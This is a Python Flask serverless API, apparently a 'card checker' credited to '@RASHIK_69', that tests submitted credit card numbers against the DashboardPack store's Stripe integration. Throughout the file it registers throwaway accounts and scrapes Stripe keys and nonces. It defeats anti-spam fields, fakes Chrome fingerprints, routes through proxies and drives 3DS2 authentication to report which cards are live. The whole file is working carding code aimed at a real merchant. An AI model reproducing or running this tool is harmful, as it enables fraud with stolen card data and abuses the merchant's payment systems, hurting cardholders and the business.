# api/chkr.py — Vercel Serverless Function (Python)
# Gateway: DashboardPack
# Route: /api/chkr?cc=NUMBER|MM|YYYY|CVC

import os
import re
import json
import uuid
import time
import string
import random
from datetime import datetime
from curl_cffi import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

# ==============================================================================
# CONFIGURATION
# ==============================================================================
BASE_URL = "https://dashboardpack.com"
CARD_COUNTRY = "BD"
OWNER = "@RASHIK_69"


# ==============================================================================
# GATEWAY LOGIC: DASHBOARDPACK PAYMENT ADDER
# ==============================================================================
class PaymentMethodAdder:
    def __init__(self, base_url: str = BASE_URL, proxy: str = None):
        self.base_url = base_url.rstrip('/')
        self.proxy_str = proxy
        self.session = requests.Session(impersonate="chrome124")
        if proxy:
            formatted_proxy = format_proxy(proxy)
            if formatted_proxy:
                self.session.proxies = formatted_proxy
        self.stripe_key = None
        self.email = None
        self.password = None
        self.create_and_confirm_nonce = None

    def generate_random_account(self):
        rand_id = str(uuid.uuid4())[:10]
        self.email = f"user_{rand_id}@testmail.com"
        chars = string.ascii_letters + string.digits + "!@#$"
        self.password = "".join(random.choice(chars) for _ in range(12)) + "1aA!"
        return self.email, self.password

    def get_registration_data(self):
        try:
            warmup_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }
            self.session.get(f"{self.base_url}/", headers=warmup_headers, timeout=15)
            time.sleep(random.uniform(0.5, 1.2))

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'referer': f"{self.base_url}/",
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }
            response = self.session.get(f"{self.base_url}/my-account/", headers=headers, timeout=15)

            if response.status_code == 200:
                data = {}
                hidden_inputs = re.findall(
                    r'<input[^>]+type="hidden"[^>]+name="([^"]+)"[^>]+value="([^"]*)"',
                    response.text
                )
                for name, value in hidden_inputs:
                    data[name] = value

                match_spam = re.search(r'<input[^>]+name="(oldtkb[^"]+)"[^>]+value="([^"]+)"', response.text)
                if match_spam:
                    data[match_spam.group(1)] = match_spam.group(2)

                wpa_match = re.search(r'"wpa_field_value":\s*(\d+)', response.text)
                if wpa_match:
                    field_name_match = re.search(r'"wpa_field_name":"(oldtkb[^"]+)"', response.text)
                    if field_name_match:
                        data[field_name_match.group(1)] = wpa_match.group(1)

                return data
            return None
        except Exception:
            return None

    def register(self, reg_info: dict) -> bool:
        if not self.email or not self.password:
            self.generate_random_account()

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': self.base_url,
            'referer': f"{self.base_url}/my-account/",
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        }

        data = {
            'email': self.email,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': f"{self.base_url}/",
            'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'wc_order_attribution_session_pages': '2',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': headers['user-agent'],
            'wpa_initiator': '',
            'woocommerce-register-nonce': reg_info.get('woocommerce-register-nonce', ''),
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
            'alt_s': '',
        }

        for k, v in reg_info.items():
            if k not in data:
                data[k] = v

        try:
            response = self.session.post(f"{self.base_url}/my-account/", headers=headers, data=data, timeout=15)
            if response.status_code == 200:
                if 'customer-logout' in response.text or 'Logout' in response.text or 'My Account' in response.text:
                    return True
            return False
        except Exception:
            return False

    def extract_stripe_key_and_nonce(self):
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': f"{self.base_url}/my-account/",
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        }

        for attempt in range(1, 4):
            try:
                response = self.session.get(f"{self.base_url}/my-account/add-payment-method/", headers=headers, timeout=15)
                if response.status_code == 200:
                    for pattern in [r'"key"\s*:\s*"(pk_live_[a-zA-Z0-9]+)"', r'"key"\s*:\s*"(pk_test_[a-zA-Z0-9]+)"']:
                        match = re.search(pattern, response.text)
                        if match:
                            self.stripe_key = match.group(1)
                            break

                    nonce_patterns = [
                        r'"wc_stripe_confirm_setup_intent_nonce"\s*:\s*"([a-f0-9]+)"',
                        r'"_ajax_nonce"\s*:\s*"([a-f0-9]+)"',
                        r'name="_ajax_nonce"\s+value="([a-f0-9]+)"',
                        r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-f0-9]+)"',
                        r'"_wpnonce"\s*:\s*"([a-f0-9]+)"',
                    ]
                    for pattern in nonce_patterns:
                        match = re.search(pattern, response.text)
                        if match:
                            self.create_and_confirm_nonce = match.group(1)
                            break

                    if self.stripe_key and self.create_and_confirm_nonce:
                        return self.stripe_key, self.create_and_confirm_nonce
            except Exception:
                if attempt < 3:
                    time.sleep(2)
        return None, None

    def create_stripe_payment_method(self, card_data: dict, hcaptcha_token: str = None) -> str:
        if not self.stripe_key:
            return None

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        }

        card_number = card_data.get('number', '').replace(' ', '').replace('-', '')

        data = {
            'type': 'card',
            'card[number]': card_number,
            'card[cvc]': card_data.get('cvc', ''),
            'card[exp_year]': card_data.get('exp_year', ''),
            'card[exp_month]': card_data.get('exp_month', ''),
            'allow_redisplay': 'unspecified',
            'billing_details[email]': self.email,
            'billing_details[address][country]': card_data.get('country', CARD_COUNTRY),
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/c3ec434e35; stripe-js-v3/c3ec434e35; payment-element; deferred-intent',
            'referrer': self.base_url,
            'time_on_page': str(random.randint(15000, 30000)),
            'guid': str(uuid.uuid4()),
            'muid': str(uuid.uuid4()),
            'sid': str(uuid.uuid4()),
            'key': self.stripe_key,
            '_stripe_version': '2026-03-25.dahlia',
            'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
        }

        if hcaptcha_token:
            data['radar_options[hcaptcha_token]'] = hcaptcha_token

        data = {k: v for k, v in data.items() if v}

        try:
            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=15)
            if response.status_code == 200:
                return response.json().get('id')
            return None
        except Exception:
            return None

    def add_payment_method_to_account(self, payment_method_id: str):
        if not self.create_and_confirm_nonce:
            return False, None, None, "No createAndConfirmSetupIntentNonce available"

        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': self.base_url,
            'referer': f"{self.base_url}/my-account/add-payment-method/",
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': self.create_and_confirm_nonce,
        }

        try:
            response = self.session.post(f"{self.base_url}/wp-admin/admin-ajax.php", headers=headers, data=data, timeout=15)
            if response.status_code == 200:
                result = response.json()
                if result.get('success'):
                    setup_intent_data = result.get('data', {})
                    setup_intent_id = setup_intent_data.get('id')
                    client_secret = setup_intent_data.get('client_secret')
                    status = setup_intent_data.get('status')

                    if status == 'succeeded':
                        return True, setup_intent_id, client_secret, "Payment method added successfully"
                    elif status == 'requires_action':
                        return False, setup_intent_id, client_secret, "requires_action"
                    return False, setup_intent_id, client_secret, f"Unexpected status: {status}"

                error_msg = result.get('data', {}).get('error', {}).get('message', 'Your card was declined.')
                return False, None, None, error_msg
            return False, None, None, f"Error adding payment method: Status {response.status_code}"
        except Exception as e:
            return False, None, None, str(e)

    def confirm_setup_intent(self, setup_intent_id: str, client_secret: str):
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36',
        }

        params = {
            'use_stripe_sdk': 'true',
            'mandate_data[customer_acceptance][type]': 'online',
            'mandate_data[customer_acceptance][online][infer_from_client]': 'true',
            'key': self.stripe_key,
            '_stripe_version': '2026-03-25.dahlia',
            'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_source]': 'l1',
            'client_secret': client_secret,
        }

        try:
            response = requests.post(
                f"https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm",
                headers=headers,
                data=params,
                impersonate="chrome120",
                timeout=15
            )
            result = response.json()
            if response.status_code == 200:
                status = result.get('status', '')
                next_action = result.get('next_action', {})

                if status == 'succeeded':
                    return 'succeeded', None, None
                elif status == 'requires_action':
                    action_type = next_action.get('type', '')
                    if action_type == 'use_stripe_sdk':
                        sdk_data = next_action.get('use_stripe_sdk', {})
                        three_ds_source = sdk_data.get('three_d_secure_2_source', '')
                        return 'requires_3ds2', three_ds_source, sdk_data
                    elif action_type == 'redirect_to_url':
                        url = next_action.get('redirect_to_url', {}).get('url', '')
                        return 'redirect', url, None
                    return 'requires_action', None, next_action
                return status, None, result

            error_msg = result.get('error', {}).get('message', 'Setup intent confirmation failed')
            return 'error', None, error_msg
        except Exception as e:
            return 'error', None, str(e)

    def authenticate_3ds2(self, source: str):
        browser_data = {
            'fingerprintAttempted': False,
            'fingerprintData': None,
            'challengeWindowSize': None,
            'threeDSCompInd': 'Y',
            'browserJavaEnabled': False,
            'browserJavascriptEnabled': True,
            'browserLanguage': 'en-US',
            'browserColorDepth': '24',
            'browserScreenHeight': '1080',
            'browserScreenWidth': '1920',
            'browserTZ': '-360',
            'browserUserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36',
        }

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36',
        }

        params = {
            'source': source,
            'browser': json.dumps(browser_data, separators=(',', ':')),
            'one_click_authn_device_support[hosted]': 'false',
            'one_click_authn_device_support[same_origin_frame]': 'false',
            'one_click_authn_device_support[spc_eligible]': 'true',
            'one_click_authn_device_support[webauthn_eligible]': 'true',
            'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',
            'frontend_execution': 'eyJmaW5nZXJwcmludE91dGNvbWUiOiJub3Rfc3VwcG9ydGVkIn0=',
            'key': self.stripe_key,
            '_stripe_version': '2026-03-25.dahlia',
        }

        try:
            response = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=params, impersonate='chrome120', timeout=15)
            if response.status_code == 200:
                result = response.json()
                state = result.get('state', '')
                ares = result.get('ares', {})
                trans_status = ares.get('transStatus', '') if ares else ''

                if state == 'succeeded':
                    return True, "3DS2 authentication succeeded"
                elif trans_status == 'C':
                    return False, "3DS challenge required"
                elif state == 'failed' or trans_status in ('R', 'N', 'U'):
                    return False, f"3DS authentication rejected (transStatus: {trans_status})"
                return False, f"3DS unknown state: {state}"
            return False, f"3DS2 authenticate HTTP {response.status_code}"
        except Exception as e:
            return False, str(e)

    def run(self, card_data: dict, hcaptcha_token: str = None):
        reg_info = self.get_registration_data()
        if not reg_info or not self.register(reg_info):
            return None, None, "declined", "Registration failed", None

        stripe_key, nonce = self.extract_stripe_key_and_nonce()
        if not stripe_key or not nonce:
            return None, None, "declined", "Failed to extract Stripe keys", None

        payment_method_id = self.create_stripe_payment_method(card_data, hcaptcha_token)
        if not payment_method_id:
            return None, None, "declined", "Failed to create payment method", None

        ajax_success, setup_intent_id, client_secret, message = self.add_payment_method_to_account(payment_method_id)

        if not ajax_success and message != "requires_action":
            return payment_method_id, None, "declined", message, None

        if ajax_success:
            return payment_method_id, setup_intent_id, "success", message, None

        confirm_status, three_ds_source, confirm_data = self.confirm_setup_intent(setup_intent_id, client_secret)

        if confirm_status == 'succeeded':
            return payment_method_id, setup_intent_id, "success", "Payment method added successfully", None
        elif confirm_status == 'redirect':
            return payment_method_id, setup_intent_id, "3ds", "3DS redirect required", three_ds_source
        elif confirm_status == 'requires_3ds2':
            ds2_success, ds2_message = self.authenticate_3ds2(three_ds_source)
            if ds2_success:
                return payment_method_id, setup_intent_id, "success", "Payment method added successfully (3DS2 passed)", None
            elif 'challenge' in ds2_message.lower():
                return payment_method_id, setup_intent_id, "3ds", ds2_message, None
            return payment_method_id, setup_intent_id, "declined", ds2_message, None
        elif confirm_status == 'error':
            return payment_method_id, setup_intent_id, "declined", str(confirm_data), None

        return payment_method_id, setup_intent_id, "declined", f"Unexpected status: {confirm_status}", None


# ==============================================================================
# HELPER FUNCTIONS
# ==============================================================================
def advanced_luhn_checksum(card_number: str) -> bool:
    digits = [int(d) for d in str(card_number) if d.isdigit()]
    if len(digits) < 13 or len(digits) > 19:
        return False
    checksum = 0
    reverse_digits = digits[::-1]
    for i, digit in enumerate(reverse_digits):
        if i % 2 == 1:
            doubled = digit * 2
            checksum += doubled - 9 if doubled > 9 else doubled
        else:
            checksum += digit
    return checksum % 10 == 0


def is_valid_card(card_number: str) -> bool:
    cleaned = str(card_number).replace(' ', '').replace('-', '')
    if not cleaned.isdigit():
        return False
    return advanced_luhn_checksum(cleaned)


def parse_card_details(auth_string: str) -> dict:
    try:
        parts = auth_string.split('|')
        if len(parts) != 4:
            return None

        card_number = parts[0].strip().replace(' ', '').replace('-', '')
        exp_month = parts[1].strip().zfill(2)
        exp_year = parts[2].strip()
        cvc = parts[3].strip()

        if len(exp_year) == 4 and exp_year.startswith('20'):
            exp_year = exp_year[2:]
        elif len(exp_year) != 2:
            return None

        return {
            'number': card_number,
            'exp_month': exp_month,
            'exp_year': exp_year,
            'cvc': cvc,
            'country': CARD_COUNTRY
        }
    except Exception:
        return None


def format_proxy(proxy_str: str) -> dict:
    if not proxy_str:
        return None
    try:
        parts = proxy_str.strip().split(':')
        if len(parts) == 4:
            proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            return {"http": proxy_url, "https": proxy_url}
    except Exception:
        pass
    return None


def handle_endpoint(auth: str, proxy: str = None, hcaptcha_token: str = None) -> tuple:
    if not auth:
        return {
            'status': 'error',
            'gateway': 'DashboardPack',
            'message': 'Missing auth parameter. Format: CARD_NUMBER|EXP_MONTH|EXP_YEAR|CVC'
        }, 400

    if '||' in auth:
        parts = auth.split('||')
        auth = parts[0]
        if not hcaptcha_token and len(parts) > 1:
            hcaptcha_token = parts[1]

    card_data = parse_card_details(auth)
    if not card_data:
        return {
            'status': 'error',
            'gateway': 'DashboardPack',
            'message': 'Invalid card details format. Use: NUMBER|MONTH|YEAR|CVC'
        }, 400

    try:
        raw_card = f"{card_data['number']}|{card_data['exp_month']}|{card_data['exp_year']}|{card_data['cvc']}"

        if not is_valid_card(card_data['number']):
            return {
                'card': raw_card,
                'gateway': 'DashboardPack',
                'status': 'error',
                'message': 'Invalid card number (Failed Luhn validation)'
            }, 200

        adder = PaymentMethodAdder(base_url=BASE_URL, proxy=proxy)
        payment_method_id, setup_intent_id, status, message, redirect_3ds = adder.run(
            card_data=card_data,
            hcaptcha_token=hcaptcha_token
        )

        result = {
            'card': raw_card,
            'gateway': 'DashboardPack',
            'status': status,
            'message': message,
            'payment_method_id': payment_method_id,
            'setup_intent_id': setup_intent_id
        }
        if redirect_3ds:
            result['redirect_3ds'] = redirect_3ds

        return result, 200
    except Exception as e:
        return {
            'status': 'error',
            'gateway': 'DashboardPack',
            'message': str(e)
        }, 500


# ==============================================================================
# FLASK APPLICATION
# ==============================================================================
app = Flask(__name__)
CORS(app)


@app.route('/', methods=['GET'])
def root():
    return jsonify({
        'service': 'DashboardPack Card Validation API',
        'status': 'online',
        'owner': OWNER,
        'version': '1.0.0',
        'endpoints': {
            'validate_get': '/api/chkr?cc=NUMBER|MM|YY|CVC[&proxy=ip:port:user:pass]',
            'validate_post': '/api/chkr (JSON body)',
            'health': '/api/health'
        }
    }), 200


@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy', 'gateway': 'DashboardPack', 'owner': OWNER}), 200


@app.route('/api/chkr', methods=['GET', 'POST'])
def validate_card():
    auth = ''
    proxy = None
    hcaptcha_token = None

    if request.method == 'POST':
        data = request.get_json(silent=True) or {}
        auth = data.get('auth', '') or data.get('cc', '')
        proxy = data.get('proxy') or request.args.get('proxy')
        hcaptcha_token = data.get('hcaptcha_token') or request.args.get('hcaptcha_token')

        if not auth and data.get('card'):
            card = str(data.get('card', '')).strip()
            month = str(data.get('month', data.get('exp_month', ''))).strip()
            year = str(data.get('year', data.get('exp_year', ''))).strip()
            cvc = str(data.get('cvc', '')).strip()
            auth = f"{card}|{month}|{year}|{cvc}"
    else:
        auth = request.args.get('auth', '') or request.args.get('cc', '')
        proxy = request.args.get('proxy')
        hcaptcha_token = request.args.get('hcaptcha_token')

    if not auth:
        return jsonify({
            'status': 'error',
            'gateway': 'DashboardPack',
            'owner': OWNER,
            'message': 'Missing auth parameter. Provide ?cc=NUMBER|MM|YY|CVC'
        }), 400

    result, status_code = handle_endpoint(auth=auth, proxy=proxy, hcaptcha_token=hcaptcha_token)
    result['owner'] = OWNER
    return jsonify(result), status_code


@app.errorhandler(404)
def not_found(error):
    return jsonify({'status': 'error', 'owner': OWNER, 'message': 'Endpoint not found. Use /api/chkr'}), 404


@app.errorhandler(500)
def server_error(error):
    return jsonify({'status': 'error', 'owner': OWNER, 'message': 'Internal server error'}), 500